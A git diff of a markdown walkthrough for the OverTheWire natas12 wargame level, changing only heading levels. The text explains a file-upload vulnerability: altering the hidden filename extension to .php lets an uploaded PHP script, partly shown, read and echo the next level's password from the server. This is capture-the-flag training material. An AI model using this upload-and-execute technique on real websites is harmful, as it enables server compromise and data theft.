@@ -9,11 +9,11 @@ eleventyNavigation:
     title: natas 12 walkthrough
     order: 30
 ---
-# Description
+## Description
 >   Username: natas12
 > 
 > URL:      http://natas12.natas.labs.overthewire.org
-## Source Code
+### Source Code
 ```php
 <?php
 
@@ -59,17 +59,17 @@ if(array_key_exists("filename", $_POST)) {
 ```
 
 ---
-# Progress
-## Observation
+## Progress
+### Observation
 From the source code, we know it keeps the file extension, and it generates a random filename to replace the original one. 
 
 First, notice that we can control the file name sent to the server side. By changing `<input type="hidden" name="filename" value="utgmtlqgnh.jpg">`, we can control the file extension. (seems useless)
 
-## Trial
+### Trial
 Use `.sh` file type : cannot execute
 Use `.php` file type : CAN execute
 
-## Make PHP file
+### Make PHP file
 Just open the file with password 
 ```php
 <?php 
@@ -79,19 +79,19 @@ echo fread($myfile,filesize($filepath));
 fclose($myfile);
 ?>
 ```
-## Upload and Access the File
+### Upload and Access the File
 Get the password.
 ---
-# Hint
+## Hint
 
 ---
-# Solving
-## Reference
+## Solving
+### Reference
 - https://portswigger.net/web-security/file-upload
-## Category
+### Category
 - [[File upload vulnerability]]
-## Techniques
+### Techniques
 - 
 
-## Tools
+### Tools
 - 
